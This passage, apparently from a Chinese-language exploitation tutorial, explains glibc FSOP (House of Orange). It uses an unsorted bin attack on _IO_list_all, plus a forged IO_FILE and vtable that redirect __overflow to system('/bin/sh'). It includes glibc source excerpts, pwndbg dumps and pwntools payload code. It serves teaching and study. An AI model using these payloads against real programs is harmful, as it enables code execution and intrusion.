  <span class="token keyword">for</span> <span class="token punctuation">(</span>fp <span class="token operator">=</span> <span class="token punctuation">(</span>FILE <span class="token operator">*</span><span class="token punctuation">)</span> _IO_list_all<span class="token punctuation">;</span> fp <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> fp <span class="token operator">=</span> fp<span class="token operator">-></span>_chain<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      run_fp <span class="token operator">=</span> fp<span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>do_lock<span class="token punctuation">)</span>
        <span class="token function">_IO_flockfile</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token comment" spellcheck="true">//check, 在后面伪造的IO_FILE中需要绕过,然后执行 _IO_OVERFLOW (fp, EOF) == EOF)</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>fp<span class="token operator">-></span>_mode <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> fp<span class="token operator">-></span>_IO_write_ptr <span class="token operator">></span> fp<span class="token operator">-></span>_IO_write_base<span class="token punctuation">)</span> 
           <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token function">_IO_vtable_offset</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span>
               <span class="token operator">&amp;&amp;</span> fp<span class="token operator">-></span>_mode <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_wide_data<span class="token operator">-></span>_IO_write_ptr
                                    <span class="token operator">></span> fp<span class="token operator">-></span>_wide_data<span class="token operator">-></span>_IO_write_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
           <span class="token punctuation">)</span>
          <span class="token operator">&amp;&amp;</span> <span class="token function">_IO_OVERFLOW</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token constant">EOF</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//参数传入IO_FILE的地址和EOF</span>
        result <span class="token operator">=</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>do_lock<span class="token punctuation">)</span>
        <span class="token function">_IO_funlockfile</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
      run_fp <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token macro property">#<span class="token directive keyword">ifdef</span> _IO_MTSAFE_IO</span>
  <span class="token function">_IO_lock_unlock</span> <span class="token punctuation">(</span>list_all_lock<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">_IO_cleanup_region_end</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property">#<span class="token directive keyword">endif</span></span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>在<code>_IO_flush_all_lockp</code>函数中会根据<code>_IO_list_all</code>中的值,依次遍历IO_FILE,那我们就想法设法构建自己的IO_FILE,若IO_FILE满足fp-&gt;<code>_mode</code> &lt;= 0 &amp;&amp; fp-&gt;<code>_IO_write_ptr</code> &gt; fp-&gt;<code>_IO_write_base</code> 然后会调用vtable中的<code>__overflow</code> 函数,我们就可以伪造一个vtable,实现在调用<code>__overflow</code>的时候调用我们的函数</p>
<p>来了解一下IO_FILE_plus结构体.</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> _IO_FILE_plus （size_of<span class="token operator">=</span><span class="token number">0x78</span><span class="token operator">+</span><span class="token number">0x8</span>）
<span class="token punctuation">{</span>
  _IO_FILE file<span class="token punctuation">;</span>
  <span class="token keyword">const</span> <span class="token keyword">struct</span> _IO_jump_t <span class="token operator">*</span>vtable<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">struct</span> _IO_FILE <span class="token punctuation">{</span>
  <span class="token keyword">int</span> _flags<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/* High-order word is _IO_MAGIC; rest is flags. */</span>
<span class="token macro property">#<span class="token directive keyword">define</span> _IO_file_flags _flags</span>

  <span class="token comment" spellcheck="true">/* The following pointers correspond to the C++ streambuf protocol. */</span>
  <span class="token comment" spellcheck="true">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span>
  <span class="token keyword">char</span><span class="token operator">*</span> _IO_read_ptr<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* Current read pointer */</span>
  <span class="token keyword">char</span><span class="token operator">*</span> _IO_read_end<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* End of get area. */</span>
  <span class="token keyword">char</span><span class="token operator">*</span> _IO_read_base<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* Start of putback+get area. */</span>
  <span class="token keyword">char</span><span class="token operator">*</span> _IO_write_base<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* Start of put area. */</span>
  <span class="token keyword">char</span><span class="token operator">*</span> _IO_write_ptr<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* Current put pointer. */</span>
  <span class="token keyword">char</span><span class="token operator">*</span> _IO_write_end<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* End of put area. */</span>
  <span class="token keyword">char</span><span class="token operator">*</span> _IO_buf_base<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* Start of reserve area. */</span>
  <span class="token keyword">char</span><span class="token operator">*</span> _IO_buf_end<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* End of reserve area. */</span>
  <span class="token comment" spellcheck="true">/* The following fields are used to support backing up and undo. */</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_save_base<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* Pointer to start of non-current get area. */</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_backup_base<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Pointer to first valid character of backup area */</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_save_end<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* Pointer to end of non-current get area. */</span>

  <span class="token keyword">struct</span> _IO_marker <span class="token operator">*</span>_markers<span class="token punctuation">;</span>

  <span class="token keyword">struct</span> _IO_FILE <span class="token operator">*</span>_chain<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//储存下一个IO_FILE的地址,这是关键,后面采用一种方法实现main_arena + 88的IO_FILE结构体的这个值指向我们所构造的fake IO_FILE</span>

  <span class="token keyword">int</span> _fileno<span class="token punctuation">;</span>
<span class="token macro property">#<span class="token directive keyword">if</span> 0</span>
  <span class="token keyword">int</span> _blksize<span class="token punctuation">;</span>
<span class="token macro property">#<span class="token directive keyword">else</span></span>
  <span class="token keyword">int</span> _flags2<span class="token punctuation">;</span>
<span class="token macro property">#<span class="token directive keyword">endif</span></span>
  _IO_off_t _old_offset<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* This used to be _offset but it's too small.  */</span>

<span class="token macro property">#<span class="token directive keyword">define</span> __HAVE_COLUMN </span><span class="token comment" spellcheck="true">/* temporary */</span>
  <span class="token comment" spellcheck="true">/* 1+column number of pbase(); 0 is unknown. */</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> _cur_column<span class="token punctuation">;</span>
  <span class="token keyword">signed</span> <span class="token keyword">char</span> _vtable_offset<span class="token punctuation">;</span>
  <span class="token keyword">char</span> _shortbuf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token comment" spellcheck="true">/*  char* _save_gptr;  char* _save_egptr; */</span>

  _IO_lock_t <span class="token operator">*</span>_lock<span class="token punctuation">;</span>
<span class="token macro property">#<span class="token directive keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">struct</span> _IO_FILE_complete
<span class="token punctuation">{</span>
  <span class="token keyword">struct</span> _IO_FILE _file<span class="token punctuation">;</span>
<span class="token macro property">#<span class="token directive keyword">endif</span></span>
<span class="token macro property">#<span class="token directive keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span>
  _IO_off64_t _offset<span class="token punctuation">;</span>
<span class="token macro property"># <span class="token directive keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span>
  <span class="token comment" spellcheck="true">/* Wide character stream stuff.  */</span>
  <span class="token keyword">struct</span> _IO_codecvt <span class="token operator">*</span>_codecvt<span class="token punctuation">;</span>
  <span class="token keyword">struct</span> _IO_wide_data <span class="token operator">*</span>_wide_data<span class="token punctuation">;</span>
  <span class="token keyword">struct</span> _IO_FILE <span class="token operator">*</span>_freeres_list<span class="token punctuation">;</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>_freeres_buf<span class="token punctuation">;</span>
<span class="token macro property"># <span class="token directive keyword">else</span></span>
  <span class="token keyword">void</span> <span class="token operator">*</span>__pad1<span class="token punctuation">;</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>__pad2<span class="token punctuation">;</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>__pad3<span class="token punctuation">;</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>__pad4<span class="token punctuation">;</span>
<span class="token macro property"># <span class="token directive keyword">endif</span></span>
  size_t __pad5<span class="token punctuation">;</span>
  <span class="token keyword">int</span> _mode<span class="token punctuation">;</span>
  <span class="token comment" spellcheck="true">/* Make sure we don't get into trouble again.  */</span>
  <span class="token keyword">char</span> _unused2<span class="token punctuation">[</span><span class="token number">15</span> <span class="token operator">*</span> <span class="token keyword">sizeof</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token keyword">sizeof</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span> <span class="token punctuation">(</span>size_t<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token macro property">#<span class="token directive keyword">endif</span></span>
<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>
<p>vtable表中结构</p>
<pre class=" language-sh"><code class="language-sh">struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow); //后面通过伪造IO_FILE使 会调用此函数指针,就修改这个为system
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
#if 0
    get_column;
    set_column;
#endif
};</code></pre>
<p>后面就将这个<code>__overflow</code> 修改为system, 然而在调用这些函数指针的时候,传入的参数是IO_FILE的地址,所以后面我们需要在自己伪造的IO_FILE的头部填入’/bin/sh\x00’,若能使<code>_IO_flush_all_lockp</code>函数在遍历的时候遍历到我们伪造的IO_FILE,且IO_FILE满足<code>_IO_overflow</code>函数的调用条件, 这样就能实现get shell,那么怎样才能让我们伪造的IO_FILE连接到我们自己伪造的IO_FILE呢? </p>
<p>那使用unsorted bin attack修改<code>_IO_list_all</code>中main_arena + 0x58,后面就要得修改main_arena + 0x58处fkae IO_FILE的 chain为我们的fake IO_FILE地址,这样在执行<code>_IO_flush_all_lockp</code>就会根据自己伪造的IO_FILE调用我们所伪造的vtable函数了.但关键是怎样使<code>_IO_flush_all_lockp</code> 在遍历 IO_FILE的时候能遍历到我们伪造的IO_FILE,就要靠下面的操作了.</p>
<h3 id="修改main-arena-fake-file中的chain-指向我们即将伪造的IO-FILE"><a href="#修改main-arena-fake-file中的chain-指向我们即将伪造的IO-FILE" class="headerlink" title="修改main_arena fake file中的chain 指向我们即将伪造的IO_FILE"></a>修改main_arena fake file中的chain 指向我们即将伪造的IO_FILE</h3><p>上面的<code>_chain</code> 的值是我们重点要如何在main_arena + 0x58处IO_FILE中设置这个值为咱们可以掌控的fake IO_FILE地址,然而unsorted bin的链表结构已经被破坏,再次申请的时候,old top chunk就不受unsorted bin 管理,注意若大小小于0x400 的bin的管理顺序为unsorted bin -&gt; small bin,若我们修改old top chunk size 为小于0x400,就可以让当前chunk受small bin进行管理,而在small bin管理的时候, 各个大小的bin的链表头部地址会储存在main_arena中,若我们想要实现修改 main_arena + 0x58处 IO_FILE中的 <code>_chain</code>的值,就需要靠small bin的管理机制来进行修改</p>
<pre><code> 若我们能够计算好大小,就能实现在main_arena部分内存中储存我们的chunk地址.下面为修改old top chunk大小为0x50所看到main_arena + 0x58中IO_FILE的结构</code></pre>
<pre class=" language-sh"><code class="language-sh">pwndbg> p *((struct _IO_FILE_plus*)((long int)&main_arena + 0x58))
$4 = {
  file = {
    _flags = 1433903120, 
    _IO_read_ptr = 0x5555557584f0 "/bin/sh", 
    _IO_read_end = 0x5555557584f0 "/bin/sh", 
    _IO_read_base = 0x7ffff7dd2510 "", 
    _IO_write_base = 0x7ffff7dd1b88 <main_arena+104> "\360\204uUUU", 
    _IO_write_ptr = 0x7ffff7dd1b88 <main_arena+104> "\360\204uUUU", 
    _IO_write_end = 0x7ffff7dd1b98 <main_arena+120> "\210\033\335\367\377\177", 
    _IO_buf_base = 0x7ffff7dd1b98 <main_arena+120> "\210\033\335\367\377\177", 
    _IO_buf_end = 0x7ffff7dd1ba8 <main_arena+136> "\230\033\335\367\377\177", 
    _IO_save_base = 0x7ffff7dd1ba8 <main_arena+136> "\230\033\335\367\377\177", 
    _IO_backup_base = 0x5555557584f0 "/bin/sh", # 这是small bin管理时,储存我们的堆地址
    _IO_save_end = 0x5555557584f0 "/bin/sh",    # 这是small bin管理时,储存我们的堆地址
    _markers = 0x7ffff7dd1bc8 <main_arena+168>, 
    _chain = 0x7ffff7dd1bc8 <main_arena+168>,  # 下一个IO_FILE的地址,这是我们想要覆盖当前地址为old top chunk addr
    _fileno = -136504360, 
    _flags2 = 32767, 
    _old_offset = 140737351850968, 
    _cur_column = 7144, 
    _vtable_offset = -35 '\335', 
    _shortbuf = <incomplete sequence \367>, 
    _lock = 0x7ffff7dd1be8 <main_arena+200>, 
    _offset = 140737351851000, 
    _codecvt = 0x7ffff7dd1bf8 <main_arena+216>, 
    _wide_data = 0x7ffff7dd1c08 <main_arena+232>, 
    _freeres_list = 0x7ffff7dd1c08 <main_arena+232>, 
    _freeres_buf = 0x7ffff7dd1c18 <main_arena+248>, 
    __pad5 = 140737351851032, 
    _mode = -136504280, 
    _unused2 = "\377\177\000\000(\034\335\367\377\177\000\000\070\034\335\367\377\177\000"
  }, 
  vtable = 0x7ffff7dd1c38 <main_arena+280>
}
pwndbg> bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all [corrupted]
FD: 0x5555557584f0 —▸ 0x7ffff7dd1bb8 (main_arena+152) ◂— 0x5555557584f0
BK: 0x7ffff7dd2510 ◂— 0x0
smallbins
0x50: 0x5555557584f0 —▸ 0x7ffff7dd1bb8 (main_arena+152) ◂— 0x5555557584f0 #释放后由small bin来管理
largebins
empty
</code></pre>
<p>那么还差0x10,就改old top chunk size 为0x60,即可在main_arena 向下偏移0x10进行储存,这就实现了在main_arena + 0x58伪造IO_FILE中实现连接我们伪造的IO_FILE,实现效果如下</p>
<pre class=" language-sh"><code class="language-sh">pwndbg> p *((struct _IO_FILE_plus*)0x00007ffff7dd1b78)
$2 = {
  file = {
    _flags = 1433903120, 
    _IO_read_ptr = 0x5555557584f0 "/bin/sh", 
    _IO_read_end = 0x5555557584f0 "/bin/sh", 
    _IO_read_base = 0x7ffff7dd2510 "", 
    _IO_write_base = 0x7ffff7dd1b88 <main_arena+104> "\360\204uUUU", 
    _IO_write_ptr = 0x7ffff7dd1b88 <main_arena+104> "\360\204uUUU", 
    _IO_write_end = 0x7ffff7dd1b98 <main_arena+120> "\210\033\335\367\377\177", 
    _IO_buf_base = 0x7ffff7dd1b98 <main_arena+120> "\210\033\335\367\377\177", 
    _IO_buf_end = 0x7ffff7dd1ba8 <main_arena+136> "\230\033\335\367\377\177", 
    _IO_save_base = 0x7ffff7dd1ba8 <main_arena+136> "\230\033\335\367\377\177", 
    _IO_backup_base = 0x7ffff7dd1bb8 <main_arena+152> "\250\033\335\367\377\177", 
    _IO_save_end = 0x7ffff7dd1bb8 <main_arena+152> "\250\033\335\367\377\177", 
    _markers = 0x5555557584f0, 
    _chain = 0x5555557584f0,  //这里指向 old top chunk,也就是我们伪造的堆块
    _fileno = -136504360, 
    _flags2 = 32767, 
    _old_offset = 140737351850968, 
    _cur_column = 7144, 
    _vtable_offset = -35 '\335', 
    _shortbuf = <incomplete sequence \367>, 
    _lock = 0x7ffff7dd1be8 <main_arena+200>, 
    _offset = 140737351851000, 
    _codecvt = 0x7ffff7dd1bf8 <main_arena+216>, 
    _wide_data = 0x7ffff7dd1c08 <main_arena+232>, 
    _freeres_list = 0x7ffff7dd1c08 <main_arena+232>, 
    _freeres_buf = 0x7ffff7dd1c18 <main_arena+248>, 
    __pad5 = 140737351851032, 
    _mode = -136504280, 
    _unused2 = "\377\177\000\000(\034\335\367\377\177\000\000\070\034\335\367\377\177\000"
  }, 
  vtable = 0x7ffff7dd1c38 <main_arena+280>
}
pwndbg> x /40gx 0x5555557584f0
0x5555557584f0:    0x0068732f6e69622f    0x0000000000000061 # 我们的old top chunk
0x555555758500:    0x00007ffff7dd1bc8    0x00007ffff7dd1bc8
0x555555758510:    0x0000000000000000    0x0000000000000001
0x555555758520:    0x0000000000000000    0x0000000000000000
0x555555758530:    0x0000000000000000    0x0000000000000000
0x555555758540:    0x0000000000000000    0x0000000000000000
0x555555758550:    0x0000000000000000    0x0000000000000000</code></pre>
<p>利用如下:</p>
<pre class=" language-python"><code class="language-python">    <span class="token comment" spellcheck="true"># Control program</span>
    p <span class="token operator">=</span> <span class="token string">'B'</span> <span class="token operator">*</span> <span class="token number">0x400</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> <span class="token string">'B'</span> <span class="token operator">*</span> <span class="token number">0x10</span>

    <span class="token comment" spellcheck="true"># fake IO_FILE</span>
    f <span class="token operator">=</span> <span class="token string">'/bin/sh\x00'</span> <span class="token comment" spellcheck="true"># overflow arg -> system('/bin/sh') 这是后续调用system会传入IO_FILE的地址</span>
    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x61</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># small bin size,使main_arena + 0x58 fake IO_FILE的_chian指向当前伪造的IO_FILE</span>

    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>_IO_list_all <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># unsoted bin attack 修改 _IO_list_all为main_arena + 0x58</span></code></pre>
<h3 id="伪造IO-FILE"><a href="#伪造IO-FILE" class="headerlink" title="伪造IO_FILE"></a>伪造IO_FILE</h3><p>上面就实现了修改main_arena + 0x58 中 fake IO_FILE的<code>_chain</code>指向我们的old top chunk,那么就在old top chunk伪造IO_FILE,在伪造的时候必须要得通过检查</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>fp<span class="token operator">-></span>_mode <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> fp<span class="token operator">-></span>_IO_write_ptr <span class="token operator">></span> fp<span class="token operator">-></span>_IO_write_base<span class="token punctuation">)</span> 
           <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token function">_IO_vtable_offset</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span>
               <span class="token operator">&amp;&amp;</span> fp<span class="token operator">-></span>_mode <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_wide_data<span class="token operator">-></span>_IO_write_ptr
                                    <span class="token operator">></span> fp<span class="token operator">-></span>_wide_data<span class="token operator">-></span>_IO_write_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
           <span class="token punctuation">)</span>
          <span class="token operator">&amp;&amp;</span> <span class="token function">_IO_OVERFLOW</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token constant">EOF</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>
        result <span class="token operator">=</span> <span class="token constant">EOF</span><span class="token punctuation">;</span></code></pre>
<p>则fp-&gt;<code>_mode</code> &lt;= 0 且fp-&gt;<code>_IO_write_ptr</code> &gt; fp-&gt;<code>_IO_write_base</code> 且<code>_IO_vtable_offset</code> (fp) == 0,这样才能执行<code>_IO_OVERFLOW (fp, EOF) == EOF)</code></p>
<p>那么利用就可以这样写</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># fake file</span>
    f <span class="token operator">=</span> <span class="token string">'/bin/sh\x00'</span> <span class="token comment" spellcheck="true"># flag overflow arg -> system('/bin/sh')</span>
    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x61</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># _IO_read_ptr small bin size</span>
    <span class="token comment" spellcheck="true">#  unsoted bin attack</span>
    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># _IO_read_end)</span>
    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span>_IO_list_all <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># _IO_read_base</span>

    <span class="token comment" spellcheck="true">#bypass check</span>
    <span class="token comment" spellcheck="true"># 使fp->_IO_write_base &lt; fp->_IO_write_ptr绕过检查</span>
    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># _IO_write_base </span>
    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># _IO_write_ptr</span>

    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># _IO_write_end</span>
    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># _IO_buf_base</span>
    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># _IO_buf_end</span>
    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># _IO_save_base</span>
    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># _IO_backup_base</span>
    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># _IO_save_end</span>
    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># *_markers</span>
    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># *_chain</span>

    f <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># _fileno</span>
    f <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># _flags2</span>

    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># _old_offset</span>

    f <span class="token operator">+=</span> p16<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># ushort _cur_colum;</span>
    f <span class="token operator">+=</span> p8<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># char _vtable_offset</span>
    f <span class="token operator">+=</span> p8<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># char _shrotbuf[1]</span>
    f <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># null for alignment</span>

    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># _offset</span>
    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># _codecvt</span>
    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># _wide_data</span>
    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># _freeres_list</span>
    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># _freeres_buf</span>

    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># __pad5</span>
    f <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># _mode 为了绕过检查,fp->mode &lt;=0 ((addr + 0xc8) &lt;= 0)</span>
    f <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># _unused2</span>
</code></pre>
<p>修改结果如下</p>
<pre class=" language-sh"><code class="language-sh">pwndbg> p *((struct _IO_FILE_plus*)0x5555557584f0)
$1 = {
  file = {
    _flags = 1852400175, 
    _IO_read_ptr = 0x61 <error: Cannot access memory at address 0x61>, 
    _IO_read_end = 0x0, 
    _IO_read_base = 0x7ffff7dd2510 "", 
    _IO_write_base = 0x0, 
    _IO_write_ptr = 0x1 <error: Cannot access memory at address 0x1>, 
    _IO_write_end = 0x0, 
    _IO_buf_base = 0x0, 
    _IO_buf_end = 0x0, 
    _IO_save_base = 0x0, 
    _IO_backup_base = 0x0, 
    _IO_save_end = 0x0, 
    _markers = 0x0, 
    _chain = 0x0, 
    _fileno = 0, 
    _flags2 = 0, 
    _old_offset = 1, 
    _cur_column = 2, 
    _vtable_offset = 3 '\003', 
    _shortbuf = "\004", 
    _lock = 0x0, 
    _offset = 6, 
    _codecvt = 0x0, 
    _wide_data = 0x0, 
    _freeres_list = 0x0, 
    _freeres_buf = 0x0, 
    __pad5 = 0, 
    _mode = 0, 
    _unused2 = '\000' <repeats 19 times>
  }, 
  vtable = 0x5555557585c8
}
</code></pre>
<h3 id="伪造-vtable"><a href="#伪造-vtable" class="headerlink" title="伪造 vtable"></a>伪造 vtable</h3><pre class=" language-python"><code class="language-python">    p <span class="token operator">+=</span> f
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token comment" spellcheck="true"># alignment to vtable</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>heap <span class="token operator">+</span> <span class="token number">0x5c8</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># vtable指向自己</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>lib<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># _IO_overflow 位置改为system</span>
